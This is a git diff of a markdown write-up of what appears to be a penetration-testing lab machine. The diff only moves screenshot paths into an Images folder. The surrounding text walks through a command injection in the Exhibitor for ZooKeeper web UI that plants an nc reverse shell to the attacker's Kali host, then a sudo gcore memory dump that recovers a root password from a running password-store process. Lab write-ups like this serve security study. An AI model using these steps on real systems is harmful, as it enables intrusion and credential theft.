@@ -178,13 +178,13 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.192.98:8081" and was redirected to "http://192.168.192.98:8080/exhibitor/v1/ui/index.html":
 
-![](Pasted%20image%2020221029153108.png)
+![](Images/Pasted%20image%2020221029153108.png)
 
 #### -Googled "Exhibitor for ZooKeeper v1.0 exploit" and found the following exploit steps:
 
-![](Pasted%20image%2020221029153214.png)
-![](Pasted%20image%2020221029153255.png)
-![](Pasted%20image%2020221029153321.png)
+![](Images/Pasted%20image%2020221029153214.png)
+![](Images/Pasted%20image%2020221029153255.png)
+![](Images/Pasted%20image%2020221029153321.png)
 #RemoteCodeExecution-ExhibitorWebUI1.71
 ---
 
@@ -194,14 +194,14 @@ Enumerated top 200 UDP ports:
 
 #### -Clicked on the Config tab, then flipped the Editing switch to ON. Typed " $(/bin/nc -e /bin/sh [kali IP] 631 &)" in the java.env script area:
 
-![](Pasted%20image%2020221029153712.png)
-![](Pasted%20image%2020221029153742.png)
+![](Images/Pasted%20image%2020221029153712.png)
+![](Images/Pasted%20image%2020221029153742.png)
 
 #### -Started a penelope listener on my kali machine listening on port 631
 
 #### -Clicked "Commit" > "All At Once" > "OK" and waited about a minute for the script to run and received a reverse shell:
 
-![](Pasted%20image%2020221029153837.png)
+![](Images/Pasted%20image%2020221029153837.png)
 
 ---
 
@@ -210,26 +210,26 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "sudo -l" and found user charles can run "/usr/bin/gcore" as sudo:
 
-![](Pasted%20image%2020221029154227.png)
+![](Images/Pasted%20image%2020221029154227.png)
 
 #### -Googled "/usr/bin/gcore" and found the binary in GTFOBINS
 
-![](Pasted%20image%2020221029154932.png)
+![](Images/Pasted%20image%2020221029154932.png)
 
 #### - Per GTFOBINS the /usr/bin/gcore can be utilized to do privileged reads or disclose files outside a restricted file system.
 
-![](Pasted%20image%2020221029155123.png)
+![](Images/Pasted%20image%2020221029155123.png)
 #/usr/bin/gcoreGTFOBINS 
 
 #### - Typed "ps aux | grep root" to find which processes were running with root privileges and found "/usr/bin/password-store" running as root:
 
-![](Pasted%20image%2020221029154326.png)
+![](Images/Pasted%20image%2020221029154326.png)
 #/usr/bin/password-store
 
 #### -Googled "/usr/bin/password-store" and found it to be a standard unix password manager
 
-![](Pasted%20image%2020221029154416.png)
-![](Pasted%20image%2020221029154455.png)
+![](Images/Pasted%20image%2020221029154416.png)
+![](Images/Pasted%20image%2020221029154455.png)
 
 
 ## Lateral Movement vector
@@ -237,12 +237,12 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "sudo /usr/bin/gcore 493" (which is the PID of /usr/bin/password-store) which created file "core.493":
 
-![](Pasted%20image%2020221029155334.png)
+![](Images/Pasted%20image%2020221029155334.png)
 
 #### - Typed "strings core.493" and found roots password "ClogKingpinInning731":
 
-![](Pasted%20image%2020221029155429.png)
-![](Pasted%20image%2020221029155622.png)
+![](Images/Pasted%20image%2020221029155429.png)
+![](Images/Pasted%20image%2020221029155622.png)
 
 ---
 
@@ -254,7 +254,7 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "su root" then provided found password "ClogKingpinInning731" and received a root shell:
 
-![](Pasted%20image%2020221029155802.png)
+![](Images/Pasted%20image%2020221029155802.png)
 
 
 
